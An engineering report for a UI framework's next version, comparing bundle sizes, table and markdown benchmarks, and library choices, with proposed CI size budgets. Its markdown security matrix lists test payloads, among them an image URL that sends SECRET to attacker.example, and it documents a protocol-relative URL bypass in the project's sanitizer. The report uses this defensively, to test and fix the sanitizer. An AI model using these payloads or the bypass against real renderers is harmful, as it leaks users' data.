# Gap: performance budgets and library tie-breaks (v3)

Measured 2026-11-09 in a scratch dir outside the repo (`/tmp/v3gap`, ephemeral). Production builds only, no dev server, nothing in any repo touched. Tags: **F** fact (measured or read, cited), **J** my judgement, **U** unverified or not comparable.

## 0. Verdicts (one line each)

| Choice                                  | Verdict                                                                                                                                                                                                              |
| --------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Bytes, Mantine to Base UI + Tailwind    | F: no JS saving. 25 Base UI parts +112.2 KB gz vs 31 Mantine components +101.5 KB JS +36.2 KB CSS. The win is CSS (-15 to -25 KB gz) and control, not JS.                                                            |
| weatherorb 704 KiB bar and 0-JS landing | J: both reachable. `/map` lands near 696 KiB (headroom ~8 KiB, today 4.8 KiB) only if the v3 provider JS is under ~5 KB. Landing stays 0 JS if it imports CSS only.                                                  |
| Class merging                           | **Compiled `cn` (shadcn-ui/cn 0.5.2, tables built with `cn build --css` from our `@theme`)**. F: tailwind-merge 3.7.0 drops `text-red-500` beside custom `text-display`; compiled tables do not. Speed is secondary. |
| Runtime merge cost                      | F: invisible at 200 virtual rows (<=1 ms per full re-class); +27 ms (14-20%) only when 10k rows sit in the DOM. React Compiler is the bigger lever (-31% sort, -78% parent re-render).                               |
| Palette engine                          | **Base UI `Autocomplete inline` in `Dialog` + own `rank()`**. F: +0.9 KB in a real page vs cmdk +16.0 KB and 24 Radix/helper packages in the tree.                                                                   |
| Markdown streaming                      | **react-markdown + remend + blockSplit (our pipeline)**. F: 56.8 KB vs Streamdown 152.2 KB; Streamdown default leaks remote images, ours does not (but see the `//host` bug in 4.3).                                 |
| Agent runtime                           | **No own runtime.** F: plain `useChat` passes StrictMode, resume, error; fails Activity hide (silent truncation). Smallest fix is an externally owned `Chat` (10-line helper + one lint rule), not a hook.           |
| Icon set                                | **Lucide** (`lucide-react`). F: 40 icons +4.8 KB (Tabler +2.8, Phosphor +24.5). J: shadcn default, agent default, daily releases.                                                                                    |

## 1. Method and versions

Vite 8.3.6, `@vitejs/plugin-react` 6.2.1, Rolldown minify, `gzipSync` default level (same as `packages/basalt-ui/scripts/check-budgets.ts:267`), `build.write:false`. Eager = entry chunk plus static imports. Every figure is **delta over `base0`** (React 19.3.1 + react-dom, createRoot, 67,828 B gz / 219,482 B raw) unless marked absolute. Single-chunk builds, so shared code (floating-ui, store) is counted once.

Versions installed (bun's 3-day release-age cooldown in `~/.bunfig.toml` honoured, so latest-3-days): `@base-ui/react` 1.9.0, `@tanstack/react-table` 9.3.1, `@tanstack/charts` 1.4.0 (registry 1.5.0), `@tanstack/react-form` 1.33.5, router 1.170.46, query 5.106.1, virtual 3.14.26, tailwindcss 4.3.4, motion 14.10.0, lucide-react 1.70.0, `@phosphor-icons/react` 2.1.10, `@tabler/icons-react` 3.51.0, streamdown 2.7.1, react-markdown 10.1.0, remend 1.4.0, cmdk 1.1.1, tailwind-merge 3.7.0, cn 0.5.2, `ai` 7.0.163, `@ai-sdk/react` 4.0.167, `@mantine/core` 9.7.5, Chrome 157, playwright-core 1.65.0.

Repro (scratch): `bun add <the list>`; `matrix.mjs` = per case `vite.build({configFile:false, plugins:[react()], build:{write:false, rolldownOptions:{input: html}}})`, gzip each chunk; runtime via `playwright-core` + `/Applications/Google Chrome.app`, static server over `vite build` output. Case files are 5-25 lines each (one per row below).

## 2. Bundle matrix (F, gz KB over base0)

| Case                                                                                  | Delta               | Note                                                                                                                |
| ------------------------------------------------------------------------------------- | ------------------- | ------------------------------------------------------------------------------------------------------------------- |
| router + query shell                                                                  | +35.5               | `createRouter`, `RouterProvider`, `useQuery`                                                                        |
| Base UI Dialog                                                                        | +20.8               | Root/Trigger/Portal/Backdrop/Viewport/Popup/Title/Description/Close                                                 |
| Base UI Drawer                                                                        | +30.3               | swipe, Content                                                                                                      |
| Base UI Popover                                                                       | +35.2               | Positioner, Arrow                                                                                                   |
| Base UI Menu                                                                          | +47.3               | Checkbox/Radio/Group/Submenu                                                                                        |
| Base UI Tooltip                                                                       | +28.7               | Provider + Positioner                                                                                               |
| Base UI Select                                                                        | +40.8               | Group, scroll arrows                                                                                                |
| Base UI Combobox                                                                      | +46.1               | multiple + chips                                                                                                    |
| Base UI Toast                                                                         | +12.8               | manager + Viewport                                                                                                  |
| Base UI NumberField                                                                   | +12.0               | ScrubArea, Group                                                                                                    |
| Base UI Tabs                                                                          | +11.7               | Indicator                                                                                                           |
| **10 primitives, one page**                                                           | **+90.1**           | standalone sum is 285.7; floating-ui/store shared (`page10`)                                                        |
| 25 Base UI parts (argo-shaped set)                                                    | +112.2              | adds Slider, Switch, Radio, Checkbox, Accordion, Collapsible, ScrollArea, Field, ToggleGroup                        |
| TanStack Table v9 sorting only                                                        | +11.4               |                                                                                                                     |
| Table v9 13 features + 7 row models/fns                                               | +23.3               | filter, global, facets (3), sort, paginate, select, expand, visibility, order, pin, size, resize, aggregate         |
| Table `stockFeatures`                                                                 | +25.9               | what `stockFeatures` costs                                                                                          |
| Table full + react-virtual                                                            | +33.5               | virtual alone about +9.5                                                                                            |
| Charts Sparkline (lineY, no guides)                                                   | +31.1               | engine floor, React adapter included                                                                                |
| Charts Lines (2 series, points, crosshair, tooltip, `scaleUtc`)                       | +38.7               | `scaleUtc` from `@tanstack/charts/scales/time`; with `d3-scale` `scaleUtc` it is +48.6                              |
| Charts Bars (scaleBand, grid, tooltip)                                                | +40.2               |                                                                                                                     |
| Charts all three                                                                      | +44.4               | second and third chart cost +4 to +7 each                                                                           |
| basalt 2.x `Sparkline` import (dist barrel)                                           | +56.2               | engine 1.1.0; v3 target <= 36                                                                                       |
| TanStack Form, no schema                                                              | +16.3               |                                                                                                                     |
| TanStack Form + zod 4.6.7                                                             | +40.0               | zod is the consumer's                                                                                               |
| Motion `LazyMotion`+`domAnimation`+`AnimatePresence`                                  | +32.7               | `domMax`+layout +46.8; full `motion` +46.6                                                                          |
| 40 icons Tabler / Lucide / Phosphor                                                   | +2.8 / +4.8 / +24.5 | Phosphor `weight="bold"` identical (+24.5)                                                                          |
| `clsx` / `cva`                                                                        | +0.2 / +0.5         |                                                                                                                     |
| `clsx`+`tailwind-merge` / `cn` default / `cn` compiled tables                         | +8.7 / +10.7 / +8.5 | compiled = 109 of 384 groups, tables 3.2 KB gz                                                                      |
| react-markdown plain                                                                  | +35.5               |                                                                                                                     |
| our pipeline (react-markdown, gfm, rehype-sanitize, remend, blockSplit, urlTransform) | +56.8               | `lib/block-split.ts`, `lib/url-hardening.ts` copied from `src/content/`                                             |
| Streamdown 2.7.1 core                                                                 | +152.2              | 3 chunks; includes `hast-util-raw`/parse5, `marked`, `tailwind-merge`                                               |
| Dialog only (palette base)                                                            | +18.5               |                                                                                                                     |
| + cmdk standalone / + Autocomplete standalone                                         | +34.5 / +35.7       | cmdk graph: 16 `@radix-ui/*` + `react-remove-scroll`, `aria-hidden`, `get-nonce`, `tslib`, 3 more helpers (24 pkgs) |
| palette inside `page10`: cmdk / Autocomplete                                          | **+16.0 / +0.9**    | shared Base UI infra makes Autocomplete nearly free                                                                 |

### 2.1 CSS (F, gz)

| Item                                                          | gz                                      | Source                                                    |
| ------------------------------------------------------------- | --------------------------------------- | --------------------------------------------------------- |
| Tailwind 4.3.4 floor (preflight + empty theme)                | 1.4 KB                                  | `@import "tailwindcss" source(none)`                      |
| Mantine core `styles.css` (full)                              | 36.2 KB                                 | `mantine-argo-set` and `mantine-wo-set` builds, identical |
| Utilities only, console `src` scan (62 tsx)                   | 8.9 KB                                  | default theme, no tokens                                  |
| Utilities only, epos `src` scan (510 tsx, tests included)     | 21.1 KB                                 | upper bound                                               |
| Real app CSS, factory console (shadcn+Base UI, tokens, fonts) | 15.2 KB (85.7 KB raw)                   | `apps/console/dist` built 2026-11-09 13:19                |
| Real app CSS, epos teamchat (324 tsx, tokens, motion)         | 29.3 KB (172.8 KB raw)                  | `ui/dist` built 2026-11-05                                |
| argo today, eager                                             | 75.6 KB (index 62.6 KB = 427,901 B raw) | `apps/dashboard/dist` built 2026-11-09 10:24              |
| weatherorb `/map` today                                       | 47.0 KB (`_app` 42.7 + index 4.0 + 0.3) | `dist/client` built 2026-10-23                            |
| rb today                                                      | 51.8 KB                                 | `apps/web/dist` built 2026-10-15                          |

J: a v3 argo lands at 20-35 KB CSS gz (console and epos bracket it), saving 40-55 KB gz. Mantine layer CSS stops being the weatherorb pain (consumer-weatherorb.md:172).

## 3. Consumers against today's numbers

All "today" figures measured by `graph.mjs` (static closure of `index.html`, gzipSync) or weatherorb's own `scripts/bundle-report.ts`.

| App               | Today (F)                                                                                                                                                                                                                | v3 projection (J)                                                                                                                                                            |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| argo `/`          | entry chunk 364,299 B; **preload closure 727,947 B JS** (69 modulepreloads) + 75,585 B CSS; all assets 1,529,089 B JS; lazy `site-map` 343,135 B + maplibre worker 144,215 B (consumer-argo.md:17 quotes only the entry) | JS roughly neutral (+10.7 KB from 31 Mantine to 25 Base UI parts, +9 cn/cva, minus basalt provider); CSS -40 to -55 KB. Unchanged: maplibre. Real number needs the port (U). |
| weatherorb `/`    | 0 JS (`bundle-bars.test.ts:80-87`); HTML 6,107 B gz + CSS 4,040 B gz                                                                                                                                                     | stays 0 JS if the landing imports the CSS-only token entry and no Base UI part (J)                                                                                           |
| weatherorb `/map` | **715,941 B = 699.2 KiB** vs bar 704 KiB (`bundle-bars.test.ts:26`), headroom 4,955 B; CSS not in the bar                                                                                                                | **~712.5 KB = ~696 KiB** (below)                                                                                                                                             |
| rb                | 332,574 B JS single chunk + 51,810 B CSS (10 routes, no route split)                                                                                                                                                     | JS +0 to +10 KB; CSS -25 KB; route-splitting is the real lever (J)                                                                                                           |

weatherorb `/map` arithmetic (F inputs, J sum): today 715,941; swap Mantine set `/map` uses (Text/Box/Stack/Group/ScrollArea/Drawer/Menu/Popover/Tabs/Slider/Switch/Radio/SegmentedControl/TextInput, from `apps/web/src` imports) **+70.9 KB (Mantine) to +73.7 KB (Base UI equivalents)** = +2.8 KB; `cn` compiled +8.5 and `cva` +0.5; remove basalt provider chunk `_app` 20,149 B (matches `PROVIDER_ONLY_CEILING = 20468`, `check-budgets.ts:373`); add v3 provider budget 5,000 B. Sum 715,941 + 2,783 + 8,960 - 20,149 + 5,000 = 712,535 B. Range +/- 15 KiB (U: I did not build weatherorb itself). Pessimistic case (provider 20 KB again) is 727,000 B = 710 KiB: **over the bar**. So the v3 provider JS budget is the number that decides it; native `<input type=range>`/checkbox for Slider/Switch/Radio frees another ~10 KB if needed.

Landing: v3 must keep a no-JS token entry (weatherorb already generates `src/landing/tokens.css` via `basalt-ui tokens:css --check`). Base UI `Tabs.Indicator renderBeforeHydration` and `CSPProvider` emit inline script (`ext-base-ui-primitives.md` section 6.1); keep Base UI out of the landing (J).

## 4. Runtime benchmarks (F unless marked)

### 4.1 Table: 10k rows, three class-composition strategies, React Compiler on and off

Fixture (mine, `bench/app.tsx`): TanStack Table v9 sorting + 8 columns (string/number/date/status badge), ~10 `cn`/`cva` calls per row, `cva` cell + badge variants, row selected/zebra classes. Chrome 157 headless, 1280x900, fresh context per run, medians, N=7 (200 rows) / N=3 (10k all in DOM). Idle frame 16.5 ms. "commit" = `el.click()` then two microtasks (React 19 flushes there); "layout" adds forced style/layout. `twmerge`=clsx+tailwind-merge 3.7.0, `cn`=cn 0.5.2 default, `static`=precomputed strings with no merge. Compiler via `reactCompilerPreset()` (`@rolldown/plugin-babel` 0.3.0, babel-plugin-react-compiler 1.0.0), verified applied (memo-cache blocks in output).

**200-row window of 10k (virtualized, overscan 183), ms:**

| Compiler | cn      | first render (render to commit) | nav to painted | re-class all visible (density) | parent re-render | sort Name (layout) | sort MRR (layout) | scroll 40 rows (2 frames) |
| -------- | ------- | ------------------------------- | -------------- | ------------------------------ | ---------------- | ------------------ | ----------------- | ------------------------- |
| off      | twmerge | 39.0                            | 94.6           | 4.3                            | 4.6              | 12.8               | 21.1              | 29.9                      |
| off      | cn      | 38.2                            | 91.4           | 4.3                            | 4.6              | 12.3               | 20.9              | 29.8                      |
| off      | static  | 32.8                            | 86.2           | 3.3                            | 3.3              | 13.6               | 19.6              | 30.4                      |
| on       | twmerge | 42.6                            | 98.6           | 3.1                            | 1.6              | 13.2               | 20.8              | 29.7                      |
| on       | cn      | 37.6                            | 94.4           | 3.0                            | 1.5              | 12.9               | 21.4              | 29.4                      |
| on       | static  | 35.8                            | 90.0           | 2.1                            | 1.6              | 12.7               | 20.3              | 29.5                      |

**10 000 rows all in the DOM, ms (N=3):**

| Compiler | cn      | first render (render to commit) | nav to painted | re-class all (density) | parent re-render | sort Name (commit / layout) | sort MRR (commit / layout) |
| -------- | ------- | ------------------------------- | -------------- | ---------------------- | ---------------- | --------------------------- | -------------------------- |
| off      | twmerge | 225.8                           | 800.1          | 158.9                  | 146.3            | 350 / 723                   | 575 / 957                  |
| off      | cn      | 219.2                           | 727.8          | 154.2                  | 144.6            | 348 / 715                   | 563 / 973                  |
| off      | static  | 197.7                           | 731.4          | 132.4                  | 119.8            | 327 / 718                   | 546 / 946                  |
| on       | twmerge | 238.9                           | 745.3          | 93.1                   | 32.5             | 240 / 615                   | 437 / 882                  |
| on       | cn      | 229.0                           | 759.9          | 82.9                   | 34.2             | 240 / 599                   | 422 / 862                  |
| on       | static  | 200.0                           | 728.0          | 62.3                   | 33.3             | 237 / 612                   | 424 / 871                  |

Reading:

- F: merge cost at 200 rows is <= 1.0 ms per full re-class and ~6 ms on first render, under half a frame. Not a v3 problem when virtualized or paginated.
- F: at 10k in the DOM, `twmerge` vs `static` is +28 ms first commit (14%) and +26.5 ms per full re-class (20%, compiler off) or +31 ms (50%, compiler on, because everything else got cheaper). `cn` sits between (about half the gap on re-class).
- F: React Compiler on: sort commit -31% (350 to 240), MRR -24%, parent-only re-render -78% (146 to 32.5 ms) and full re-class -41%. Its first render is flat (+/-5%). A bare parent re-render at 200 rows 4.6 to 1.6 ms.
- F micro (100k calls, `micro/cn.tsx`, ns/call, 3 fresh pages): warm repeated strings `twmerge` 82-115 / `cn` 13-41 / `clsx` 25-59; **cache-hostile pool of 5,000 distinct combos** (tailwind-merge LRU is 500) `twmerge` 3,046-3,236 / `cn` 278-459 (7-11x); first call in a page `twmerge` 3.0-3.5 ms / `cn` 0.8-0.9 ms.
- F correctness (node): `twMerge('text-red-500 text-display')` returns `text-display`, so the colour is dropped; same for `cn` default; a `cn build --css theme.css` table returns both classes and merges `text-prose text-display` to `text-display`. epos hit the same and compiles tables (`shadcn-epos-teamchat.md:88,169`; `ext-toolchain.md:76`). v3 ships custom type/shadow scales, so this is a bug-class, not a speed knob.
- J verdict: `cn` compiled from `@theme` (a build step, CI fails on stale tables as epos does). `static` strings are the fastest but unenforceable for consumer `className` overrides.

### 4.2 Against the 2.x baseline

`docs/waves/evidence/w6/table-baseline-1.41.md` (first render 1,477.8 ms, sort Name 2,139.6 ms over a 58 ms idle frame) and `table-v9-10k.md` (master: 1,606.7 ms first render, sort Name 1,665.6 over control) were taken in an environment with a 58 ms idle frame; mine idles at 16.5 ms. They are **not comparable in absolute terms (U)**. So I ran the 2.x table itself in my environment: `BasaltDataTable` from `packages/basalt-ui/dist/table` (dist built 2026-10-24, same `TablePerfPage` 10k rows, sorting + global search, `maxHeight` 600), compiler off, N=3:

|                                      | 2.x `BasaltDataTable` | lean v3-shaped fixture (4.1, off/twmerge) | ratio       |
| ------------------------------------ | --------------------- | ----------------------------------------- | ----------- |
| first render commit / nav to painted | 1,380 / 1,972 ms      | 226 / 800 ms                              | 6.1x / 2.5x |
| sort Name commit / layout            | 1,207 / 1,614 ms      | 350 / 723 ms                              | 3.4x / 2.2x |
| sort MRR commit / layout             | 1,067 / 1,450 ms      | 575 / 957 ms                              | 1.9x / 1.5x |

J: the fixture has no filters, selection, kinds, Mantine primitives per cell. It shows the headroom, not what v3 will ship. Proposed gate (J): the v3 `DataTable` on this exact fixture, compiler off, may be at most the lean fixture x1.6 (first render nav-to-painted <= 1,300 ms, sort Name layout <= 1,150 ms), i.e. a fixed fraction of 2.x, never a number from another machine. With `virtual` the same fixture must stay below 3 frames (50 ms) for sort and first render nav-to-painted <= 150 ms.

## 5. Tie-breaks

### 5.1 Palette engine: Autocomplete in Dialog, no cmdk

| Criterion                     | cmdk 1.1.1                                                                                                    | Base UI `Autocomplete inline` + own `rank()`                                                | Evidence                                                                                                                                                    |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Marginal bytes in a real page | +16.0 KB                                                                                                      | +0.9 KB                                                                                     | `page10-cmdk` 106.1 vs `page10-auto` 91.0 vs `page10` 90.1                                                                                                  |
| Radix in the tree             | 16 `@radix-ui/*` + 8 helpers (`react-remove-scroll`, `aria-hidden`, `get-nonce`...)                           | none                                                                                        | `matrix-all.json` pkgs; `ext-base-ui-primitives.md` verdict 4 (section 0) says the Console palette chunk is 28.3 KB gz and carries `data-radix-focus-guard` |
| Ranking                       | built-in command-score fuzzy; both owner apps disabled it (`shouldFilter={false}`, console `palette.tsx:213`) | own: 4 tiers prefix > word-start > substring > subsequence, ~20 lines                       | browser run: "dep" gives Deploy now first; cmdk default put "Go to Deployments" first (group order ahead of prefix)                                         |
| Grouping                      | `Command.Group`                                                                                               | `Autocomplete.Group` + `Collection`; group order by best hit, ~6 lines                      | both render 3 groups; "dsh" fuzzy only in cmdk (matches via keywords, noisy)                                                                                |
| Keyboard                      | built-in                                                                                                      | built-in: `autoHighlight="always"` highlights first, ArrowDown moves, Enter fires `onClick` | `pal/app.tsx` run: after "dep" + ArrowDown + Enter picked `dep-roll` as expected                                                                            |
| Effort                        | zero, then disabled                                                                                           | ~45 lines (`rank`, `score`, group map, item)                                                | `pal/app.tsx`                                                                                                                                               |

Verdict (J): one `CommandPalette` = Dialog + inline Autocomplete + `defineCommands` registry + our `rank()`. Guarantee: lint bans `cmdk` and `@radix-ui/*` imports; type gate on command registry (`when()` read on open). Teach: skill "commands vs nav entries". Open: per-app ranking source, extra groups.

### 5.2 Markdown streaming: react-markdown + remend + blockSplit

SSR security matrix (F, `renderToStaticMarkup` in Chrome, 12 payloads, `md/sec.tsx`):

| Payload                                                | Streamdown default                                                          | Streamdown pinned (`harden`: no image prefixes, https/mailto, no data) | react-markdown default | our pipeline                                   |
| ------------------------------------------------------ | --------------------------------------------------------------------------- | ---------------------------------------------------------------------- | ---------------------- | ---------------------------------------------- |
| `![x](https://attacker.example/p?d=SECRET)`            | **renders `<img>` and emits `<link rel=preload as=image>` to the attacker** | blocked, placeholder text                                              | **`<img>` + preload**  | blocked, alt text                              |
| `data:` image                                          | blocked                                                                     | blocked                                                                | `<img>` kept           | blocked                                        |
| `javascript:` link                                     | blocked                                                                     | blocked                                                                | `href=""`              | blocked                                        |
| raw `<img onerror>`, `<script>`, `<iframe>`, `<style>` | inert                                                                       | inert (escaped text)                                                   | inert (escaped)        | inert                                          |
| `http:` link / `//host` link                           | button (link safety), no href                                               | no href                                                                | **`href` kept**        | `http:` blocked, **`//attacker.example` kept** |

New finding (F, bug in basalt 2.x): `isAllowedUrl` is `url.startsWith(prefix)` (`src/content/url-hardening.ts:19-20`) and the untrusted image default is `['/']` (`markdown.tsx:100-102`, documented as "same-origin only"). `//attacker.example/p?d=SECRET` and `/\attacker.example/x` start with `/`, so `createUrlTransform` returns them unchanged (run: `bun tt.mjs`); a protocol-relative image is a full exfil channel. The v3 transform must treat `/` as "single slash not followed by `/` or `\`" (parse with `new URL(u, 'https://x.invalid')` and compare origin).

Cost (F, 909 token steps of 8 chars over a 7.3 KB document, `flushSync` per step, `md/stream.tsx`):

| Engine                                        | total ms    | p50 / p95 / max step | first-10% / last-10% median  | DOM nodes |
| --------------------------------------------- | ----------- | -------------------- | ---------------------------- | --------- |
| Streamdown `mode=streaming isAnimating`       | 327-339     | 0.30 / 0.8 / 6.3-8.9 | 0.5 / 0.3                    | 897       |
| react-markdown + blockSplit + memo + remend   | 223-235     | 0.20 / 0.6 / 4.0-4.4 | 0.3 / 0.2                    | 448       |
| react-markdown + remend, whole doc each token | 3,077-3,133 | 3.4 / 6.3 / 7.6-11   | 0.8 / 6.1 (linear in length) | 448       |

Verdict (J): keep our pipeline; adopt Streamdown ideas only (sentinels already shared via remend). Bytes -95 KB, default-safe, half the DOM. Gains Streamdown has and we skip: code/mermaid/math/CJK plugins (lazy anyway in ours), animation, per-block controls. Gate: lint bans `streamdown` and `rehype-raw` imports outside `content/`; `Markdown` requires `contentTrust` (no default) in agent paths; unit test for `//host`, `/\host`, `data:` on both link and image. This closes the spike in `ext-ai-streaming-mdx.md:83` without a day of integration.

### 5.3 Agent runtime: run the A-laws against plain `useChat`

Harness (`agent/app.tsx`): real React 19.3.1 in Chrome, fake `ChatTransport` (24 deltas, 25 ms apart, server run continues independent of the client and replays on `reconnectToStream`, `resumeStreamIsReplay:true`), `Chat`/`useChat` from `@ai-sdk/react` 4.0.167. Source cause (F): `useChat` registers `useEffect(() => () => chat.stop(), [chat])` for an internally created Chat (`node_modules/@ai-sdk/react/dist/index.js:310-316`).

| #   | Scenario                                                                | Law     | Result                                                                                            |
| --- | ----------------------------------------------------------------------- | ------- | ------------------------------------------------------------------------------------------------- |
| S1  | StrictMode, internal chat, send                                         | A3      | pass: ready, 1 assistant message, complete (86/86 chars)                                          |
| S2  | StrictMode + `resume:true`, page opened mid-stream                      | A3, A14 | pass: `reconnectToStream` once, complete, no duplicated text                                      |
| S3  | `<Activity>` hidden 300 ms mid-stream, internal chat                    | A3, A4  | **FAIL: stream aborted (cancelled=1), status `ready`, text truncated at 27/86 chars, no error**   |
| S3b | same + `resume:true` + replay transport                                 | A3      | pass, reconnect called 2x, complete (needs a resumable server)                                    |
| S4  | `<Activity>` hide/show, externally owned `Chat` (`useChat({chat})`)     | A3, A4  | pass: never cancelled, complete                                                                   |
| S9  | StrictMode + Activity, `useState(() => new Chat())` + `useChat({chat})` | A3      | pass, complete                                                                                    |
| S5  | genuine unmount mid-stream, internal chat                               | A1      | aborted by design (cancelled=1)                                                                   |
| S5b | genuine unmount, external chat, remount 500 ms later                    | A1      | stream keeps running, remount shows full text; the app must `chat.stop()` when a thread is closed |
| S6  | error chunk at word 10                                                  | A9      | pass: status `error`, message `boom`, partial text (30 chars) kept                                |
| S8  | no `crypto.randomUUID` (insecure context)                               | A10     | pass: ids generated                                                                               |
| S7  | renders per delta                                                       |         | 26 renders for 24 deltas; `experimental_throttle:100` gives 10                                    |

Verdict: a wedge in the basalt sense (status stuck `streaming`) does not occur; the AI SDK instead fails **silently** under Activity (S3). That is A4's law ("never hide streaming UI with Activity", `self-agent-content.md:170`) now backed by a source line and a run, and it stops being a rule consumers must remember when the Chat is owned outside the component. **Recommendation (J): no own runtime** (drop `useAgentRun`, `ThreadsStore`, `ThreadFeed`: `self-agent-content.md:260`). Smallest addition:

```ts
// basalt-ui/ai: the whole "runtime"
const chats = new Map<string, Chat<UIMessage>>()
export const chatFor = (id: string, init: ChatInit<UIMessage>) =>
  chats.get(id) ?? (chats.set(id, new Chat({ id, ...init })), chats.get(id)!)
export const closeChat = (id: string) => {
  chats.get(id)?.stop()
  chats.delete(id)
}
```

Guarantee: replace `basalt/agent-no-raw-usechat` (A1) by `basalt/agent-chat-owned`: `useChat()` without a `chat` option is an error; keep `ai-sdk-major` (A2) and the exhaustive part switch. Teach: skill "agent chat" states S3/S5b: the Chat lives outside the component; throttle 50-100 ms; close = `closeChat`. Leave open: transport, persistence, thread list, assistant-ui as a second documented wiring. Not tested here (U): A5 virtualised transcript, A6 wire-data renderer hardening, A7 preliminary tool snapshots, A13 composer; those are UI-level and carry over as tests.

### 5.4 Icon set: Lucide

|                                                 | Lucide 1.70.0 | Tabler 3.51.0              | Phosphor 2.1.10                                                          |
| ----------------------------------------------- | ------------- | -------------------------- | ------------------------------------------------------------------------ |
| 40 icons, gz over base0 (F)                     | +4.8 KB       | +2.8 KB                    | +24.5 KB (all six weights ship per icon; epos prunes with a Vite plugin) |
| Release cadence (F, `ext-toolchain.md:151-153`) | near-daily    | 2026-11-08                 | last npm 2025-05-22                                                      |
| shadcn `iconLibrary` (F)                        | default       | supported                  | supported                                                                |
| Used by                                         | rollhook      | argo (43 files), linewatch | epos (163 imports), console                                              |

Verdict (J): **Lucide**. Bytes are a wash (2 KB at 40 icons); what decides is that shadcn blocks, registry copies and agent output default to `lucide-react`, so the guaranteed path equals the generated path and the lint (`icons only from lucide-react, named imports`) fires least. Cost: argo/linewatch Tabler to Lucide and epos/console Phosphor to Lucide are mechanical renames (`shadcn migrate icons` exists, `ext-toolchain.md:157`). Runner-up Tabler (smaller, bigger domain set) if the owner weights argo's existing imports over shadcn alignment. Guarantee: `no-restricted-imports` for the other sets; `icon` props typed `LucideIcon`; stroke width as one token. Open: custom SVG glyphs via the same `icon` slot.

## 6. Budgets for `check-budgets.ts` (proposal, J on the numbers, F on the baselines)

Today's byte gates (F): provider-only 20,468 B (`check-budgets.ts:373`), embedded provider peers bundled 56,766 B (`:397`), theme-only 15,882 B (`:422`); counts for symbols, subpaths, rule lines. They measure basalt's own code; none measures what a primitive pulls in. v3 changes the unit.

**6.1 Per-subpath gate (framework CI, `pre`).** Build each fixture with peers bundled, subtract an in-gate `base0` built by the same run (robust to React bumps), ceiling = measured +5% rounded up to 0.5 KB. Re-baseline once the real wrappers exist (they add `cva`+`cn`, ~1.5 KB each at most).

| Fixture                                                                                 | Measured (KB)               | Ceiling (KB)                                                            |
| --------------------------------------------------------------------------------------- | --------------------------- | ----------------------------------------------------------------------- |
| `ui/dialog`                                                                             | 20.8                        | 22.0                                                                    |
| `ui/drawer`                                                                             | 30.3                        | 32.0                                                                    |
| `ui/popover`                                                                            | 35.2                        | 37.0                                                                    |
| `ui/menu`                                                                               | 47.3                        | 50.0                                                                    |
| `ui/tooltip`                                                                            | 28.7                        | 30.5                                                                    |
| `ui/select`                                                                             | 40.8                        | 43.0                                                                    |
| `ui/combobox`                                                                           | 46.1                        | 48.5                                                                    |
| `ui/toast`                                                                              | 12.8                        | 13.5                                                                    |
| `ui/number-field`                                                                       | 12.0                        | 12.5                                                                    |
| `ui/tabs`                                                                               | 11.7                        | 12.5                                                                    |
| `ui` ten-primitive page (the real gate; standalone rows only catch wrapper regressions) | 90.1                        | 95.0                                                                    |
| `ui` 25-part argo-shaped page                                                           | 112.2                       | 118.0                                                                   |
| `table` sorting only / 13 features / + virtual                                          | 11.4 / 23.3 / 33.5          | 12.0 / 24.5 / 35.5                                                      |
| `charts` Sparkline / Lines / Bars / all three                                           | 31.1 / 38.7 / 40.2 / 44.4   | 32.5 / 40.5 / 42.5 / 46.5 (engine floor; our layer on top <= 4 KB each) |
| `form` (no schema)                                                                      | 16.3                        | 17.0                                                                    |
| `cn` compiled                                                                           | 8.5                         | 9.0                                                                     |
| 40 icons (Lucide)                                                                       | 4.8                         | 5.0                                                                     |
| `ai` chat UI incl. motion `m` (lazy subpath)                                            | n/a, build at first wrapper | motion part <= 34.0                                                     |
| `content` Markdown pipeline (lazy)                                                      | 56.8                        | 60.0                                                                    |
| palette marginal inside `ui` page                                                       | 0.9                         | 2.0                                                                     |
| provider/theme JS (what weatherorb needs)                                               | n/a                         | **5.0** (today 20.5)                                                    |

Hard zeros (F pattern from `check-budgets.ts:456-458`): dev-only chunks in a production build 0; `streamdown`, `cmdk`, `@radix-ui/*`, `tailwind-merge` modules in any fixture 0 (the `cn` module is the one exception for `tailwind-merge`-free builds); full `motion` component 0 (only `m`).

**6.2 Per-route gate (consumer CI, shipped as `basalt-ui budget`, absorbing weatherorb `scripts/bundle-graph.ts` and `bundle-report.ts`, PLAN Wave 92).** A consumer `budgets.json` per route: `{route, entry, followDynamic, skip, jsGzipMax, cssGzipMax, maxScripts}`; `doctor` fails if routes exist and no first-load budget is declared. Seed values:

| Route                                 | Today                        | Bar (proposal)                                                                                    |
| ------------------------------------- | ---------------------------- | ------------------------------------------------------------------------------------------------- |
| weatherorb `/`                        | 0 JS, 0 `<script>`           | 0 B JS, `maxScripts: 0`, total <= 80 KiB (existing, `bundle-bars.test.ts:25`)                     |
| weatherorb `/map` incl. workers       | 699.2 KiB JS                 | <= 704 KiB (existing, `:26`); CSS <= 15 KB gz                                                     |
| argo `/` first load (preload closure) | 727,947 B JS / 75,585 B CSS  | v3 port <= 700 KB JS / <= 50 KB CSS; then a route-scoped preload so the shell loads <= 400 KB (J) |
| argo `site-map` lazy                  | 343,135 B + 144,215 B worker | unchanged                                                                                         |
| rb `/`                                | 332,574 B JS / 51,810 B CSS  | <= 340 KB JS (<= 250 KB after route split) / <= 30 KB CSS                                         |
| table fixture (runtime, 10k)          | 2.x: 1,972 ms nav to painted | <= 1,300 ms (4.2); virtual <= 150 ms                                                              |

## 7. The four questions

| Area              | Implement                                                     | Guarantee                                                                         | Teach                                                                                    | Leave open                             |
| ----------------- | ------------------------------------------------------------- | --------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- | -------------------------------------- |
| Bytes and budgets | `basalt-ui budget` CLI; fixture gate with in-gate floor       | `check-budgets` per-subpath rows, per-route `budgets.json`, `doctor` requires one | skill `basalt-performance`: cost table (section 2), lazy boundaries, 0-JS landing recipe | route splitting, which routes preload  |
| Class merging     | compiled `cn` from `@theme`, `cva`                            | CI fails on stale tables; lint bans `tailwind-merge` import outside `lib/cn`      | rule text: `cn` only at component edge, no dynamic class assembly                        | consumer `className` overrides         |
